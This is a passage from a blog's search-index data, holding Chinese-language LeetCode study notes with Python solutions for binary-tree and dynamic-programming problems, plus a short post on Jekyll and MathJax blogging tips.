def generateTrees(self, n: int) -&amp;gt; List[Optional[TreeNode]]: def helper(i: int, j: int) -&amp;gt; List[Optional[TreeNode]]: if i == j: return [TreeNode(val=i)] if i &amp;gt; j: return [None] node_list = [] for k in range(i, j+1): left_list = helper(i, k-1) right_list = helper(k+1, j) for left_node in left_list: for right_node in right_list: node_list.append(TreeNode(val=k, left=left_node, right=right_node)) return node_list return helper(1, n)96. Unique Binary Search Trees根据整数 n，给出所有由值为从 1 到 n 的节点组成的 BST 的数量。与上一题思路相似，设计一个_rec(i:int, j:int) -&amp;gt; int的递归函数。其中两个指针i、j指示目标 BST 对应的节点值的头和尾。事实上总的 BST 的数量只和 j+1-i也就是与数组的长度有关，因此根据 DP 的思路，建一个表，将计算的内容存储到表内可以大量节省时间。class Solution: def numTrees(self, n: int) -&amp;gt; int: # 创建储存结果的表 num_dict = {} def _rec(i:int, j:int) -&amp;gt; int: if i &amp;gt; j+1 or j+1 &amp;lt;= i or i == j: return 1 # 无节点或者只有一个节点返回 1 if j+1-i in num_dict: return num_dict[j+1-i] # 如果结果已计算则查表 else: # 如果结果未计算，则遍历i到j+1，再对其子树对应数组调用递归，返回数量为左子树数量乘以右子树的数量 num_total = 0 for k in range(i, j+1): num_left_tree = _rec(i, k-1) num_right_tree = _rec(k+1, j) num_total += num_left_tree * num_right_tree # 将结果存入表 num_dict[j+1-i] = num_total return num_total return _rec(0, n-1)98. Validate Binary Search Tree判断一个树是否是一个 BST。利用 BST 的中序遍历结果是一个有序数组的特性，对其进行中序遍历，将遍历的每个节点的值插入于一个val_list的末尾。同时遍历到每一个节点时都判断其值是否大于val_list中的最后一个元素，否则输出False。若于该节点的判断没有问题，则最后递归函数的结果取决于左子树和右子树的遍历结果的与运算。# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def isValidBST(self, root: Optional[TreeNode]) -&amp;gt; bool: val_list = [] def _rec(l: List[int], root: Optional[TreeNode]) -&amp;gt; bool: # 判断是否为空节点 if not root: return True # 递归左子树 is_BST_left = _rec(val_list, root.left) # 中序遍历操作 if val_list and root.val &amp;lt;= val_list[-1]: return False val_list.append(root.val) # 递归右子树 is_BST_right = _rec(val_list, root.right) return is_BST_left and is_BST_right return _rec(val_list, root)99. Recover Binary Search Tree找出 BST 中唯一交换的两个节点并复原。思路如上一题，中序遍历二叉树，通过将节点的值与前一个节点的值进行比较，找到出现问题的两个节点，将其交换即可。所谓的有问题，其实是节点的值小于中序遍历的上一个节点。唯一需要注意的是当两个节点在中序遍历的结果中相邻时，其交换后只能找到一个有问题的节点。因此在遍历结束进行判断并追加操作即可。# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def recoverTree(self, root: Optional[TreeNode]) -&amp;gt; None: &quot;&quot;&quot; Do not return anything, modify root in-place instead. &quot;&quot;&quot; def _rec(root: Optional[TreeNode]): nonlocal node_1, node_2, pre_node if not root: return # 遍历左子树 _rec(root.left) # 中序遍历操作 if pre_node and root.val &amp;lt; pre_node.val: if not node_1: # 如果node_1没赋值，说明找到的是第一个交换节点 node_1 = pre_node node_2 = root else: # 如果node_1已经赋值，则说明目前遍历的是第二个节点 # 于是可以在此交换两节点的值，并结束递归 temp = node_1.val node_1.val = root.val root.val = temp node_2 = None return pre_node = root # 遍历右子树 _rec(root.right) node_1, node_2, pre_node = None, None, None _rec(root) if node_2: temp = node_1.val node_1.val = node_2.val node_2.val = temp102. Binary Tree Level Order Traversal思路：队列 + 前序遍历# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def levelOrder(self, root: Optional[TreeNode]) -&amp;gt; List[List[int]]: node_queue = [] res_list = [] def _rec(root: Optional[TreeNode], lv:int): if not root: return if len(res_list) &amp;lt; lv + 1: res_list.append([root.val]) else: res_list[lv].append(root.val) node_queue.append((root.left, lv + 1)) node_queue.append((root.right, lv + 1)) _rec(*node_queue.pop(0)) _rec(*node_queue.pop(0)) _rec(root, 0) return res_list103. Binary Tree Zigzag Level Order Traversal与上一题思路一致# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def zigzagLevelOrder(self, root: Optional[TreeNode]) -&amp;gt; List[List[int]]: res_list = [] node_queue = [] def _rec(root: Optional[TreeNode], lv:int): if not root: return if lv &amp;gt;= len(res_list): res_list.append([root.val]) else: if lv%2 == 0: res_list[lv].append(root.val) else: res_list[lv].insert(0, root.val) node_queue.append((root.left, lv + 1)) node_queue.append((root.right, lv + 1)) _rec(*node_queue.pop(0)) _rec(*node_queue.pop(0)) _rec(root, 0) return res_list105. Construct Binary Tree from Preorder and Inorder Traversal106. Construct Binary Tree from Inorder and Postorder Traversal107. Binary Tree Level Order Traversal II113. Path Sum II给定一个二叉树和一个targetSum，以数组形式返回所有从根节点到叶节点的值相加等于targetSum的路径。因此从根节点出发，遍历其到达任意一个叶节点的路径，在每一个叶节点处判断，如果该路径上的节点值的和等于targetSum，则逐节将各个节点的值插入到结果的list中返回。代码如下：# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def pathSum(self, root: Optional[TreeNode], targetSum: int) -&amp;gt; List[List[int]]: # 判断二叉树是否为空 if not root: return [] # 构造一个递归函数来遍历二叉树 # 信息向下传递（从根到叶）时，将目前累加的和叠加并向下传递 # 到达叶节点时将判断累加和是否等于 targetSum # 信息向上传递（从叶到根）时，将以 list 形式返回所有经过该点的合法路径，各节点将自身的值插入其中并继续向上传递 def _rec(root: Optional[TreeNode], current_sum) -&amp;gt; List[List[int]]: ### 信息向下传递过程中的预处理 nonlocal targetSum # 累加路径和 current_sum += root.val # 判断是否为叶节点 if not root.left and not root.right and current_sum == targetSum: return [[root.val]] list_left, list_right = [], [] ### 递归调用于左子树 if root.left: list_left = _rec(root.left, current_sum) ### 递归调用于右子树 if root.right: list_right = _rec(root.right, current_sum) ### 信息向上传递过程 # 将左子树和右子树返回的可能路径合并到一个 list 中 res_list = list_left + list_right # 对 list 中的每一个路径插入本节点的值 for node_list in res_list: node_list.insert(0, root.val) return res_list return _rec(root, 0)其实从这一题中可以抽象出一个二叉树遍历的整体逻辑，那就是信息的向下与向上传递的过程。在这一题中，路径目前累加的和作为信息向下（从根到叶）传递，而对于这个信息的预处理过程则在递归调用子树之前。当我们想把信息向下传递时，可以将该信息以递归函数的参数的形式传递。而在叶节点判断完毕后，路径信息则以 list 的形式向上传递，而每一个节点对于信息的后处理则在递归调用子树之后。当我们想把信息向上回传时，通常将其作为递归函数的返回值来传递。因此整体框架如下：def _rec(root: Optional[TreeNode], *info_to_end) -&amp;gt; info_return: ### 向下传递信息预处理 # ... # *info_to_left, *info_to_right = pre_process(root, *info_to_end ...) # ... ### 递归调用于左子树 if root.left: info_left = _rec(root.left, *info_to_left) ### 如果左右子树的传入信息还有因果性，则可以在此处处理 ### 递归调用于右子树 if root.right: info_right = _rec(root.right, *info_to_right) ### 向上传递信息后处理 # ... # info_return = post_process(root, info_left, info_right, ...) return info_return框架中的 pre_process post_process 函数只是将信息的预处理和后处理过程抽象化了，代表意义就是将当前节点的信息和上游传来的信息相结合处理后，再返回给下游，不论从父节点到子节点还是从子节点到父节点，都是一样的。124. Binary Tree Maximum Path Sum# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def maxPathSum(self, root: Optional[TreeNode]) -&amp;gt; int: sum_max = -1001 def _rec(root: Optional[TreeNode]) -&amp;gt; int: # 判断是否为空节点 if not root: return 0 nonlocal sum_max # 递归左子树 max_left = _rec(root.left) # 递归右子树 max_right = _rec(root.right) # 计算只取半边时该节点处最大值 max_branch = max(root.val, root.val + max_left, root.val + max_right) # 与全局最大值作比较时还要考虑左右两子树合并的情况，即无法继续向上扩展的情况 val_max = max(max_branch, root.val + max_left + max_right) if val_max &amp;gt; sum_max：sum_max = val_max # 返回可衔接的情况下的最大值 return max_branch _rec(root) return sum_max114. Flatten Binary Tree to Linked List# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def flatten(self, root: Optional[TreeNode]) -&amp;gt; None: &quot;&quot;&quot; Do not return anything, modify root in-place instead. &quot;&quot;&quot; if not root: return None def _rec(root: Optional[TreeNode]) -&amp;gt; Optional[TreeNode]: end_left = end_right = root if root.left: end_left = _rec(root.left) end_right = end_left if root.right: end_right = _rec(root.right) if root.left: end_left.right = root.right root.right = root.left root.left = None return end_right _rec(root)116. Populating Next Right Pointers in Each Node这一题可以和前面某题结合起来讨论在二叉树问题中临时存储变量的需求。&quot;&quot;&quot;# Definition for a Node.class Node: def __init__(self, val: int = 0, left: &#39;Node&#39; = None, right: &#39;Node&#39; = None, next: &#39;Node&#39; = None): self.val = val self.left = left self.right = right self.next = next&quot;&quot;&quot;class Solution: def connect(self, root: &#39;Node&#39;) -&amp;gt; &#39;Node&#39;: node_list = [] def _rec(root: &#39;Node&#39;, lv:int): if not root: return nonlocal node_list if len(node_list) &amp;lt;= lv: node_list.append(root) else: node_list[lv].next = root node_list[lv] = root _rec(root.left, lv + 1) _rec(root.right, lv + 1) _rec(root, 0) for node in node_list: node.next = None return root129. Sum Root to Leaf Numbers236. Lowest Common Ancestor of a Binary Tree# Definition for a binary tree node.# class TreeNode:# def __init__(self, x):# self.val = x# self.left = None# self.right = Noneclass Solution: def lowestCommonAncestor(self, root: &#39;TreeNode&#39;, p: &#39;TreeNode&#39;, q: &#39;TreeNode&#39;) -&amp;gt; &#39;TreeNode&#39;: self.val_q = q.val self.val_p = p.val self.ans = None self.post_order(root) return self.ans def post_order(self, root: &#39;TreeNode&#39;) -&amp;gt; bool: if not root: return False is_cur_node = root.val == self.val_q or root.val == self.val_p left_found = self.post_order(root.left) right_found = self.post_order(root.right) if is_cur_node and (left_found or right_found): self.ans = root return False if left_found and right_found: self.ans = root return False return is_cur_node or left_found or right_found297. Serialize and Deserialize Binary Tree将节点一一编上序号，然后再得到前序遍历和中序遍历的序号 List，以及前序遍历的 val 的 List。之后根据前序遍历和中序遍历的序号 List 还原二叉树结构，然后按照前序遍历的顺序把 val 的值一个一个填进去即可。tip. 编号是为了防止出现因为 Node 值重复从而导致无法还原树结构的情况。331. Verify Preorder Serialization of a Binary Treeclass Solution(object): def isValidSerialization(self, preorder): slot = 1 for c in preorder.split(&#39;,&#39;): slot -= 1 #each elemet consumes a slot if slot&amp;lt;0: return False if c!=&#39;#&#39;: slot += 2 #each non-null node also create 2 slot return slot==0 #all slots should be fill337. House Robber III个人目前的主要问题是对问题本身的思考不够准确和清晰，导致最终写出来的代码是符合脑子所想的解决方案，但是脑子里的解决方案本身却有问题。如果把解题的逻辑归纳如下：题目 -&amp;gt; 解决方案（脑子） -&amp;gt; 代码目前从第一步到第二步的过程还需要锻炼。# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def rob(self, root: Optional[TreeNode]) -&amp;gt; int: def _rec(root): if not root: return 0, 0 max_left_theif, max_left_no_theif = _rec(root.left) max_right_theif, max_right_no_theif = _rec(root.right) max_theif = root.val + max_left_no_theif + max_right_no_theif max_no_theif = 0 + max(max_left_no_theif, max_left_theif) + max(max_right_no_theif, max_right_theif) return max_theif, max_no_theif return max(_rec(root))437. Path Sum III我在这一题用了两个递归函数来进行两重遍历，时间复杂度为O(N^2)。但是实际上只需要一次遍历即可，需要牺牲一点空间复杂度来存储路径结果，但是时间复杂度只需要O(N)。首先题目中需要寻找的目标路径有两种：从根开始到当前节点的完整路径和不从根开始的不完整路径，我们需要获得每一条符合要求的路径的加和信息，才能计算出总的满足条件的路径的数量。参考讨论里一个大神的 Back tracking 解决方案， 他给遍历路径信息提供了一个很好的思路：首先构造一个递归函数来遍历树中的每一个节点。当我们遍历到某一节点时，我们将它当前完整路径上所有节点的加和以出现次数的形式存储在一个mapping字典里，也就是加 1。那么当我们从根遍历到该节点的时候，mapping里就存储了从根到这个路径上每一个节点的历史加和和对应的出现次数。最关键的就是接下来这一想法：当前的完整路径加和与mapping里存储的历史加和的差值就是以该历史加和对应的中间节点为起点，到当前节点的不完整路径的加和。于是，以当前路径为起始点，向着根方向的所有包含当前节点的路径对应的加和信息都存储在mapping里，包含完整路径，因为 0 也在字典中。而函数通过遍历每一个点，从而可以不重复地判断所有的路径加和信息。在递归调用完左子树和右子树之后，回溯到上一个节点的状态，从字典中将当前的完整路径和的出现次数减 1 即可。# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def pathSum(self, root: TreeNode, sum: int) -&amp;gt; int: ans = [0] def dfs(node, curr_sum): if not node: return # 判断当前节点往根方向是否存在满足条件的路径和 # 并将该路径和对应的路径数累加到结果上 curr_sum += node.val if (curr_sum - sum) in mapping: ans[0] += mapping[curr_sum - sum] # 将当前完整路径的和存储在字典内 mapping[curr_sum] += 1 # 递归调用 dfs(node.left, curr_sum) dfs(node.right, curr_sum) # 回溯 mapping[curr_sum] -= 1 mapping = defaultdict(int) mapping[0] = 1 dfs(root, 0) return ans[0]508. Most Frequent Subtree Sum和 easy 题 501. Find Mode in Binary Search Tree 一个思路。利用 mapping 来存储 occurrence 信息，再判断频数最高的数据。# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def findFrequentTreeSum(self, root: Optional[TreeNode]) -&amp;gt; List[int]: sub_tree_sum_mapping = defaultdict(int) res_sum = [] most_occurrence = 0 def _rec(root): if not root: return 0 nonlocal most_occurrence left_sum = _rec(root.left) right_sum = _rec(root.right) cur_sum = root.val + left_sum + right_sum sub_tree_sum_mapping[cur_sum] += 1 if sub_tree_sum_mapping[cur_sum] &amp;gt; most_occurrence: res_sum.clear() res_sum.append(cur_sum) most_occurrence = sub_tree_sum_mapping[cur_sum] elif sub_tree_sum_mapping[cur_sum] == most_occurrence: res_sum.append(cur_sum) return cur_sum _rec(root) return res_sum513. Find Bottom Left Tree Value515. Find Largest Value in Each Tree Row和上一题一样的思路，熟练掌握节点深度信息的顺向传递即可。538. Convert BST to Greater Tree623. Add One Row to Tree652. Find Duplicate Subtrees对子树的和进行哈希来减少判断次数，然后使用遍历来判断是否是重复子树。653. Two Sum IV - Input is a BSTBFS 广度优先搜索，使用双向队列来实现队列作为辅助结构class Solution: def findTarget(self, root: Optional[TreeNode], k: int) -&amp;gt; bool: deque=collections.deque([root]) s=set() while deque: node=deque.popleft() if k-node.val in s: return True s.add(node.val) if node.left: deque.append(node.left) if node.right: deque.append(node.right) return FalseDFS 同样用双向队列实现栈作为辅助结构class Solution: def findTarget(self, root: Optional[TreeNode], k: int) -&amp;gt; bool: deque=collections.deque([root]) s=set() while deque: node=deque.pop() if k-node.val in s: return True s.add(node.val) if node.right: deque.append(node.right) if node.left: deque.append(node.left) return False654. Maximum Binary Tree655. Print Binary Tree662. Maximum Width of Binary Tree669. Trim a Binary Search Tree687. Longest Univalue Path671. Second Minimum Node In a Binary Tree简单题，但是广度优先搜索比递归要快得多。因为 DFS 更方便提前终止程序。701. Insert into a Binary Search Tree按照 BST 的性质搜索，将目标节点作为叶节点插入在最后即可。865. Smallest Subtree with all the Deepest Nodes814. Binary Tree Pruning863. All Nodes Distance K in Binary Tree" }, { "title": "Blog - 博文撰写相关技巧", "url": "/posts/Blogging-skills/", "categories": "Blogging, Blog", "tags": "Blog, Jekyll", "date": "2021-10-20 08:44:00 +0800", "snippet": "文件存放_posts 需要发布的博客的存放位置_drafts 草稿的存放位置内容编辑页面跳转方法一、跳转到指定位置需要点击的位置的代码：[跳转文字](#label)目标位置的代码：&amp;lt;div id=&quot;label&quot;&amp;gt;&amp;lt;/div&amp;gt;label 可以设置为任意字符串方法二、跳转到指定标题该方法需要首先确保 markdown 引擎为 kramdown，在 _config.yml 里需要以下代码：markdown: kramdown然后需要点击的位置的代码同上：[跳转文字](#label)然后在需要跳转目标标题的代码后面加上{#label}即可：## 1.标题一 {#label}图片引用数学公式虽然在 GitHub Page 上使用 Jekyll 支持 Markdown 语法，但如果要显示公式，则需要借用 MathJax 帮助渲染。方法： 设置markdown引擎为kramdown，方法为在 _config.yml 里添加：markdown: kramdown 在 .md 文件或者博文开始插入以下代码段即可：&amp;lt;head&amp;gt; &amp;lt;script src=&quot;https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot; type=&quot;text/javascript&quot;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script type=&quot;text/x-mathjax-config&quot;&amp;gt; MathJax.Hub.Config({ tex2jax: { skipTags: [&#39;script&#39;, &#39;noscript&#39;, &#39;style&#39;, &#39;textarea&#39;, &#39;pre&#39;], inlineMath: [[&#39;$&#39;,&#39;$&#39;]] } }); &amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;参考：How to support latex in GitHub-pages?MathJax Documentation特殊符号、加帽子符号、横线和波浪线" }, { "title": "LeetCode 刷题记录 - Dynamic Programming", "url": "/posts/LeetCode_dynamic_programming/", "categories": "Blogging, LeetCode", "tags": "LeetCode, Dynamic programming", "date": "2021-10-18 09:40:00 +0800", "snippet": " 32. Longest Valid Parenthesesclass Solution: def longestValidParentheses(self, s: str) -&amp;gt; int: dp = [0] * len(s) for i in range(1, len(s)): if s[i] == &#39;)&#39;: if s[i-1] == &#39;(&#39;: dp[i] = (dp[i-2] + 2) if i &amp;gt;= 2 else 2 elif i-dp[i-1]-1 &amp;gt;= 0 and s[i-dp[i-1]-1] == &#39;(&#39;: dp[i] = dp[i-1] + 2 + (dp[i-dp[i-1]-2] if i-dp[i-1]-2 &amp;gt;= 0 else 0) return max(dp, default=0)本解法中体现的动态规划思路：假设输入list为s, 初始化一个相同长度的全 0 的 list dp作为存放结果的表，通过遍历输入s对dp进行赋值更新。dp[i]的值为当输入为list[:i+1]时的 Longest Valid Parentheses，即输出。因此我们有dp[0] = 0。而当我们找到从s[i]、s[i-1]以及dp[i-1]推出dp[i] 的关系时，我们也就可以通过这一递推关系构造整个dp数列。44. Wildcard Matching 通配符匹配当一个问题输入的大小不定时，通常我们需要考虑使用 DP 的思想，尤其是一些涉及到字符串的问题。在此问题中，当通配符为*时，子问题会产生分裂。即当p[j] == &#39;*&#39;时，helper(i, j)的值取决于helper(i+1, j)和helper(i, j+1)。此时，需要使用递归来解决的这一产生分支的问题。而在通配符为任意其他字符时，匹配结果不会产生分支：或不匹配返回False，或者取决于helper(i+1, j+1)。class Solution: def isMatch(self, s: str, p: str) -&amp;gt; bool: @lru_cache(None) def helper(i, j): if i == len(s) and j == len(p): return True if i == len(s): return helper(i, j + 1) if p[j] == &#39;*&#39; else False if j == len(p): return False if p[j] == &#39;?&#39;: return helper(i + 1, j + 1) if p[j] == &#39;*&#39;: return helper(i, j + 1) or helper(i + 1, j) if s[i] != p[j]: return False return helper(i + 1, j + 1) return helper(0, 0)45. Jump Game II查表法解决。通过一个 list jump记录到达每一个位置i所需的最小步数。使用指针i对 list nums 进行迭代就可以更新jump的值。指针j表示目前已知可以最快到达的位置。class Solution: def jump(self, nums: List[int]) -&amp;gt; int: if len(nums) == 1: return 0 jump = [0] * len(nums) i, j = 0, 0 while i &amp;lt; len(nums): r = i + nums[i] if r &amp;gt;= len(nums) - 1: return jump[i] + 1 if r &amp;gt; j: while j &amp;lt; r: j += 1 jump[j] = jump[i] + 1 i += 155. Jump Game子问题：每个 index 是否是可以到达的状态转移方程：每个 index + 自身的 jump 数量决定了该 index 往后 jump 数量的 index 的可否到达属性。重复子问题：每个 index 的可否到达属性被重复计算class Solution: def canJump(self, nums: List[int]) -&amp;gt; bool: result = [False] * len(nums) result[0] = True cur_index = 0 max_reach = 0 while cur_index &amp;lt; len(nums) and result[cur_index]: cur_reach = cur_index + nums[cur_index] + 1 if cur_reach &amp;gt;= len(nums): return True if cur_reach &amp;gt; max_reach: for i in range(max_reach, cur_reach): result[i] = True max_reach = cur_reach cur_index += 1 return False62. Unique Paths子问题：到达每一个位置的路径数量状态转移方程：每一个位置的路径数量等于其上边位置和左边位置的路径数量的和。重复子问题：无class Solution: def uniquePaths(self, m: int, n: int) -&amp;gt; int: result = [[0]*n]*m result[0][0] = 1 for i in range(m): result[i][0] = 1 for j in range(n): result[0][j] = 1 for i in range(1, m): for j in range(1, n): result[i][j] = result[i-1][j] + result[i][j-1] return result[-1][-1]63. Unique Paths II64. Minimum Path Sum72. Edit Distance关于思路，这篇编辑距离文章已经讲的很清楚了，下面直接整理几个关键。a. 子问题假设子字符串 word1[:i], word2[:j]之间的最短编辑距离记为 DP(i, j)。那么求出所有 i, j 对应的 DP(i, j) 则构成子问题的集合。b. 状态转移方程的确定：DP(i, j) 可以从 DP(i-1, j), DP(i, j-1) 和 DP(i-1, j-1) 三个子问题的答案推出。但是需要根据 word1[i] 和 word2[j] 的关系来进行分类讨论：如果 word1[i] == word2[j]，因为对应字母相同，不需要任何操作。对应代码为：DP[i][j] = DP(i-1, j-1)如果 word1[i] != word2[j]，则对应字母不同，则需要进行操作，三个操作前状态分别对应三个操作：DP(i-1, j) -&amp;gt; DP(i, j) 对应已知从 word1[:i-1] 转换到 word2[:j] 的最小编辑距离再加上从 word1[:i] 到 word1[:i-1] 的一步删除操作DP(i, j-1) -&amp;gt; DP(i, j) 对应已知从 word1[:i] 转换到 word2[:j-1] 的最小编辑距离再加上从 word2[:j-1] 到 word2[:j] 的一步插入操作DP(i-1, j-1) -&amp;gt; DP(i, j) 对应已知从 word1[:i-1] 转换到 word2[:j-1] 的最小编辑距离再加上从 word1[:i] 转换到 word2[:j] 最后一位的替换操作最后取这三种操作中编辑距离最下的情况，代码则是：DP[i][j] = min(res[i - 1][j], res[i][j - 1], res[i-1][j-1]) + 1总体代码如下：class Solution: def minDistance(self, word1: str, word2: str) -&amp;gt; int: m = len(word1)+1 n = len(word2)+1 res = [[0]*n for i in range(m)] # 初始化 DP table res[0][0] = 0 for i in range(1, m): res[i][0] = i for j in range(1, n): res[0][j] = j for i in range(1, m): for j in range(1, n): # 状态转移方程 if word1[i-1] == word2[j-1]: res[i][j] = res[i-1][j-1] else: res[i][j] = min(res[i - 1][j], res[i][j - 1], res[i-1][j-1]) + 1 return res[m-1][n-1]84. Largest Rectangle in Histogram关键结构：单调栈Leetcode 84：柱状图中最大的矩形（超详细的解法！！！）class Solution: def largestRectangleArea(self, heights: List[int]) -&amp;gt; int: # 递增栈 n = len(heights) mono_stack = [] max_area, i = 0 ,0 while i &amp;lt; n: if not mono_stack or heights[i] &amp;gt;= heights[mono_stack[-1]]: mono_stack.append(i) i += 1 else: j = mono_stack.pop() max_area = max(max_area, (i - mono_stack[-1] - 1 if mono_stack else i)*heights[j]) while mono_stack: j = mono_stack.pop() max_area = max(max_area, (i - mono_stack[-1] - 1 if mono_stack else i)*heights[j]) return max_area85. Maximal Rectangle该问题可以按照行为单位拆解为若干子问题，第i行对应的子问题是求解一道以matrix[i][:]这一行为底，以i+1为最大柱子高度的 84 题。创建 dp table 以构建每一个子问题的输入，可以得出dp[i][j]就是从dp[0][j]一直到dp[i][j]累计的柱子长度。然后按照 84 题的构建单调栈的思路来解决每一个子问题即可。class Solution: def maximalRectangle(self, matrix: List[List[str]]) -&amp;gt; int: rows, cols = len(matrix), len(matrix[0]) # initial dp table dp = [[0] * cols for i in range(rows)] # Initial mono-stack monostack = list() res = 0 for i in range(rows): for j in range(cols): # 状态转移方程 if matrix[i][j] == &#39;1&#39;: dp[i][j] = dp[i-1][j] + 1 if i &amp;gt; 0 else 1 else: dp[i][j] = 0 # 按照 84 题思路，逐个处理“柱子高度” while(monostack and dp[i][monostack[-1]] &amp;gt; dp[i][j]): k = monostack.pop() res = max(res, dp[i][k] * (j - monostack[-1] - 1 if monostack else j)) monostack.append(j) # 逐个弹出单调栈中剩余的“柱子高度”并计算最大面积 while(monostack): k = monostack.pop() res = max(res, dp[i][k] * (cols - monostack[-1] - 1 if monostack else cols)) return res 300. 最长递增子序列 Longest Increasing Subsequence (LIS)一、动态规划思路一在这里，如何定义 DP 表内元素的意义是关键。定义 DP 表内元素的意义 = 定义子问题如何定义子问题很重要，子问题的定义如同桥梁，需要照顾两个方面： 要足够具体（易于实现），保证可以快速找到状态转移方程； 要足够贴近全局问题，使得从所有子问题的解中可以快速推导出全局问题的解。 思路一，将DP[i]定义为以第 i 个元素为结尾的 LIS 的长度。那么状态转移方程就可以通过第 i 位与 从 0 到 i-1 位的大小关系来得到：$DP[i] = Max_{0 \\leq k \\leq i-1, N_k &amp;lt; N_i}(DP[k]) + 1$而全局问题的解就是 DP 表里所有子问题的最大值。该解法的时间复杂度为 $O(N^2)$。class Solution: def lengthOfLIS(self, nums: List[int]) -&amp;gt; int: n = len(nums) dp = [0]*n dp[0] = 1 for i in range(1,n): lis = 1 for j in range(i): if nums[j] &amp;lt; nums[i]: lis = max(lis, dp[j] + 1) dp[i] = lis return max(dp)二、动态规划思路二 + 二分法思路二，将DP[i]定义为所有长为 i+1 的递增子序列中最后一位的最小值。所以 DP 数组的初始状态就是 DP = [nums[0]]。然后按顺序遍历数组，更新 DP： 当 nums 中的元素 num 大于 DP[-1] 时，说明找到了比当前最长子序列末位更大的数，因此可以将 num 添加到 DP 末尾。 当 nums 中的元素 num 小于等于 DP[-1] 时，则需要找到 DP[:-1] 中最小的大于 num 的数，将其更新为 num。这里其实蕴含了贪心的思想。因为我们在遍历每一个元素时，总是希望该元素之前的递增子序列的末位尽可能地小，这样才能尽可能长地构造递增子序列。而相同长度的子序列只需要保留末位最小的就可以了。 通过简单的反证法可以证明 DP 是单调递增的，因此在第二步时可以使用二分法，进一步将时间复杂度压缩到 $O(Nlog(N))$。class Solution: def lengthOfLIS(self, nums: List[int]) -&amp;gt; int: n = len(nums) # dp[i] 表示所有长为 i + 1 的递增子序列中末位的最小值 dp = [nums[0]] for num in nums[1:]: if num &amp;gt; dp[-1]: # 找到更长的递增子序列 dp.append(num) else: # 二分查找需要更新的递增子序列长度 i, j = 0, len(dp) - 1 while i &amp;lt; j: mid = (i+j) // 2 if num &amp;gt; dp[mid]: i = mid + 1 else: j = mid dp[i] = num # 最终 DP 数组的长度就是最长递增子序列的长度 return len(dp)参考链接：动态规划设计：最长递增子序列追加题：输出最长的上升子序列491. 递增子序列看似是递增子序列相关，但实际上是一道需要使用回溯技巧的题。class Solution: def findSubsequences(self, nums: List[int]) -&amp;gt; List[List[int]]: ans = [] path = [] def backtrack(nums, start_index): # 将当前位置的数字加入递增子序列 path.append(nums[start_index]) # 判断当前递增子序列是否满足条件 if len(path) &amp;gt; 1: ans.append(path.copy()) # 遍历递增子序列下一个数字的选择 # 使用 repeated_num 来避免做出重复选择 repeated_num = set() for i in range(start_index+1, len(nums)): # 只要是大于当前数字的数都可以作为下一个选择 if nums[i] &amp;gt;= path[-1] and nums[i] not in repeated_num: repeated_num.add(nums[i]) # 调用回溯算法 backtrack(nums, i) # 将当前位置的数字撤出递增子序列 path.pop() # 每一个数都可以作为递增子序列的起点 # 使用 visited_num 避免起点数字的重复 visited_num = set() for i, num in enumerate(nums): if num not in visited_num: visited_num.add(num) # 对起点调用回溯算法 backtrack(nums, i) return ans334. 递增的三元子序列面试字节跳动 Resso 业务的时候考到的题目。使用最长递增子序列的两个思路都可以做，但是使用第二个更直观方便。如果这里的三元改为多元，那么题目实质上就变成了求最长递增子序列。而维护的数就不是 num_1，num_2 而是一个数组，如果求最长递增子序列一样用二分法来寻找需要替换更新的位置。class Solution: def increasingTriplet(self, nums: List[int]) -&amp;gt; bool: n = len(nums) if n &amp;lt; 3: return False num_1, num_2 = nums[0], float(&#39;inf&#39;) for num in nums[1:]: if num &amp;gt; num_2: return True elif num &amp;gt; num_1: num_2 = num else: num_1 = num return False87. Scramble String借助递归进行穷举，存储中间计算过程减少重复计算。class Solution: def isScramble(self, s1: str, s2: str) -&amp;gt; bool: n = len(s1) memo = dict() def dp(i1, j1, i2, j2): if (i1, j1, i2, j2) in memo: return memo[(i1, j1, i2, j2)] if j1 == i1: memo[(i1, j1, i2, j2)] = s1[i1] == s2[i2] return memo[(i1, j1, i2, j2)] res = False for k in range(j1 - i1): res = res or (dp(i1, i1+k, i2, i2+k) and dp(i1+k+1, j1, i2+k+1, j2)) \\ or (dp(i1, i1+k, j2-k, j2) and dp(i1+k+1, j1, i2, j2-k-1)) memo[(i1, j1, i2, j2)] = res return memo[(i1, j1, i2, j2)] return dp(0, n-1, 0, n-1)87. Super Egg Drop在这道题里，决定问题状态的有两个变量：楼层数，鸡蛋数。因此将 DP 数组定义为：DP[i][j] 表示在鸡蛋数量为 j 时确定 i 层所需要的最少操作数。在状态转移时进行二分查找选择最优操作，可惜时间要求达不到。class Solution: def superEggDrop(self, k: int, n: int) -&amp;gt; int: # 初始化 dp = [[0]*k for i in range(n+1)] for i in range(n+1): dp[i][0] = i for j in range(k): dp[0][j] = 0 # 状态转移方程 for i in range(1, n+1): for j in range(1, k): dp[i][j] = i left = 1 right = i # # 遍历方法，复杂度O(k*n*n) # for l in range(1, i+1): # dp[i][j] = min(dp[i][j], max(dp[l-1][j-1], dp[i-l][j]) + 1) # 二分查找法，复杂度O(k*n*log(n)) while left &amp;lt;= right: mid = (left + right) // 2 broken = dp[mid-1][j-1] + 1 not_broken = dp[i-mid][j] + 1 if broken &amp;gt; not_broken: right = mid - 1 dp[i][j] = min(dp[i][j], broken) else: left = mid + 1 